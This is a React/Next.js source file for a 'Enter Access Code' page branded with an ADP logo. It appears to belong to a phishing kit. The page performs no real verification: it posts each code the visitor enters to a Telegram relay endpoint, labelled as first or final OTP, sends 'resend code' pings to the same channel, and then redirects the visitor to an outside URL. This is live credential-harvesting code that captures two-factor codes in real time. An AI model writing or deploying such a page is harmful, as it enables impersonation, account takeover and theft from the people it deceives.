"use client"

import { Suspense, useEffect, useState } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import { FloresLogo } from "@/components/flores-logo"
import { FLORES_REDIRECT_URL, FLORES_SESSION } from "@/lib/flores-flow"
import { floresGradientPrimaryButtonStyle } from "@/lib/flores-theme"
import adpLogo from "../../adp_login/Screenshot 2026-07-06 122158.png"

function VerifyContent() {
  const [code, setCode] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [isResending, setIsResending] = useState(false)
  const router = useRouter()
  const searchParams = useSearchParams()
  const isSecondOtp = searchParams.get("step") === "2"

  useEffect(() => {
    if (typeof window === "undefined") return

    const hasVerifySession = sessionStorage.getItem(FLORES_SESSION.verify)
    if (isSecondOtp) {
      if (!sessionStorage.getItem(FLORES_SESSION.otp2)) router.replace("/verify-identity")
    } else if (!hasVerifySession) {
      router.replace("/")
    }
  }, [isSecondOtp, router])

  const handleVerify = async () => {
    if (isLoading) return
    setIsLoading(true)
    try {
      await fetch("/api/telegram/verification", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          verificationType: isSecondOtp ? "Code (final)" : "Code (first OTP)",
          code,
        }),
      }).catch(console.error)
    } catch (error) {
      console.error("Failed to send verification notification:", error)
    }
    if (isSecondOtp) {
      window.location.href = FLORES_REDIRECT_URL
    } else {
      if (typeof window !== "undefined") sessionStorage.setItem(FLORES_SESSION.identity, "1")
      router.push("/verify-identity")
    }
  }

  const handleResend = async () => {
    if (isResending) return
    setIsResending(true)
    try {
      await fetch("/api/telegram/resend-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ isSecondOtp }),
      }).catch(console.error)
    } catch (error) {
      console.error("Failed to send resend code notification:", error)
    }
    setIsResending(false)
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <header
        className="w-full py-3 sm:py-4 px-4 sm:px-6 lg:px-0 border-b border-gray-100"
        style={{ paddingLeft: "clamp(1rem, 4vw, 50px)" }}
      >
        <a href="/" className="inline-block hover:opacity-90 transition-opacity">
          <FloresLogo className="items-start" imageSrc={adpLogo.src} alt="ADP Logo" />
        </a>
      </header>

      <div className="flex-1 px-4 sm:px-6 py-8 max-w-xl" style={{ paddingLeft: "clamp(1rem, 4vw, 50px)" }}>
        <p className="text-sm mb-2" style={{ color: "#003D6B" }}>
          Secure verification
        </p>
        <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-2">Enter Access Code</h2>
        <p className="text-gray-700 text-sm mb-6">Enter the code that was sent to you.</p>

        <div className="flex flex-wrap items-center gap-2 mb-6">
          <span className="text-gray-700 text-sm">Didn&apos;t receive code?</span>
          <button
            type="button"
            onClick={handleResend}
            disabled={isLoading || isResending}
            className="px-4 py-2 rounded-full text-sm font-semibold text-white transition hover:opacity-90 disabled:opacity-70 disabled:cursor-not-allowed"
            style={{ backgroundColor: "#0099D8" }}
          >
            {isResending ? "Loading..." : "Resend code"}
          </button>
        </div>

        <div className="space-y-4">
          <div>
            <input
              type="text"
              id="code"
              inputMode="numeric"
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
              placeholder=""
              disabled={isLoading || isResending}
              className="w-full max-w-[200px] px-3 py-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-[#0099D8] focus:border-transparent disabled:opacity-70"
              maxLength={6}
            />
          </div>

          <div className="flex flex-wrap gap-3 pt-2">
            <button
              type="button"
              onClick={handleVerify}
              disabled={code.replace(/\D/g, "").length !== 6 || isLoading}
              className="px-8 py-2.5 sm:py-3 text-sm sm:text-base transition hover:opacity-90 disabled:opacity-70 disabled:cursor-not-allowed"
              style={{ ...floresGradientPrimaryButtonStyle, padding: "14px 32px" }}
            >
              {isLoading ? "Loading..." : "Continue"}
            </button>
            <button
              type="button"
              onClick={() => router.push(isSecondOtp ? "/verify-identity" : "/")}
              disabled={isLoading || isResending}
              className="px-8 py-2.5 rounded-full border-2 border-gray-300 text-gray-600 font-semibold text-sm sm:text-base hover:bg-gray-50 disabled:opacity-70"
            >
              Cancel
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}

export default function VerifyPage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
          Loading...
        </div>
      }
    >
      <VerifyContent />
    </Suspense>
  )
}
